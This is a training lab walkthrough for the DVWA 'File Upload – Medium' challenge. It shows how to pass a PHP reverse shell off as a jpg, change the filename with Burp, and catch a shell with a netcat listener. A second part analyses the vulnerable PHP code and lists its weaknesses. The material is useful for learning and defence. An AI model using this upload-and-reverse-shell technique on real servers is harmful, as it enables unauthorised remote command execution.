# File Upload - Medium

---

## Attack Steps

1. Open Burp Suite

    - Start a **temporary project**

2. Navigate to the proxy tab
    - Shortcut `CTRL + SHIFT + P`

3. Ensure the intercept is OFF 
    - Open the chromium browser

4. Navigate to DVWA and set difficulty to medium 

    - http://<ip address>/dvwa
    - Login
    ```bash 
    admin
    password
    ```
    - Navigate to DVWA Security on the left menu 
    - Set security level to medium

5. Navigate to the target webpage 
    - http://<ip address>/dvwa/vulnerabilites/upload

6. Make a copy of `php_reverse_shell.php` and save as a jpg file:

    - `CTRL + ATL + T` to open a terminal 

    ```bash 
    sudo cp /usr/share/webshells/php/php_reverse_shell.php php_reverse_shell.jpg
    ```

7. Prepare for upload:
    
    - Return to target page
    - Browse for `php_reverse_shell.jpg`
    - Select file 
    - DO NOT UPLOAD 

8. Turn intercept on 

    - On Burp Suite turn the intercept on to catch request

9. Upload file:

    - Request will be caught by Burp

10. Edit request in Burp Proxy: 
    
    - Scroll down to filename
    - Change from
    ```bash 
    filename="php_reverse_shell.jpg"
    ```
    - to:
    ```bash 
    filename="php_reverse_shell.php"
    ```
    
11. Forward the request

    - Turn intercept off

12. On the kali terminal start a listener 

    ```bash 
    nc -lvnp 1234 # If you changed the port number in the webshell file then change it here 
    # l - listener mode
    # v - verbose output 
    # n - skip DNS resolution (faster) 
    # p <port number> - Listen on port number assigned # Change to your port number
    ```

13. Navigate to the uploaded webshell 

    - The uploaded file was saved to http://<ip address>/dvwa/hackable/upload/php-reverse-shell.php

    - Alternatively run `curl -s http://<ip address>/dvwa/hackable/upload/php-reverse-shell.php` in another terminal 

14. On the netcat listener look a connection
    
    - The should be output similar to the following 
    ```bash 
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    sh: no job control in this shell 
    sh-3.2$ 
    ```

    - We can now run commands on the DVWA machine

## Vulnerable Code Analysis


### File 
`/var/www/dvwa/vulnerabilities/upload/source/medium`

#### Key Vulnerability Points:

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

	// Is it an image?
	if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
		( $uploaded_size < 100000 ) ) {

		// Can we move the file to the upload folder?
		if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
			// No
			$html .= '<pre>Your image was not uploaded.</pre>';
		}
		else {
			// Yes!
			$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
		}
	}
	else {
		// Invalid file
		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
	}
}

?>
```

### Explanation

- The code takes the uploaded file directly from the user without proper validation or sanitisation of the filename:

    ```php
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename($_FILES['uploaded']['name']);
    ```

- It retrieves file information such as name, MIME type, and size from the uploaded file:

    ```php
    $uploaded_name = $_FILES['uploaded']['name'];
    $uploaded_type = $_FILES['uploaded']['type'];
    $uploaded_size = $_FILES['uploaded']['size'];
    ```

- It attempts to validate the file by checking if the MIME type is `"image/jpeg"` or `"image/png"` and if the size is less than 100,000 bytes (approximately 100 KB):

    ```php
    if( ($uploaded_type == "image/jpeg" || $uploaded_type == "image/png") && ($uploaded_size < 100000) ) {
    ```

- If the validation passes, it moves the uploaded file to the target directory:

    ```php
    move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path);
    ```

- If the move fails, it shows an error message; if successful, it confirms the upload.

- If the validation fails (wrong file type or size), it shows a rejection message.

- Causes

    - **MIME type check is weak and can be spoofed:** The script relies on the MIME type sent by the client, which attackers can manipulate e.g using Burp Suite

    - **Filename not sanitised:** Using `basename()` only strips directory paths but does not prevent dangerous filenames or double extensions (e.g., `shell.php.jpg`).

    - **No verification of file content:** The script does not check if the file is actually a valid image (e.g., via `getimagesize()`), so malicious files can be disguised as images.

    - **Uploads saved in a web-accessible directory:** Uploaded files can be accessed and potentially executed by visiting their URL.

    - **No filename randomisation:** This can lead to file overwriting or easier targeting by attackers.


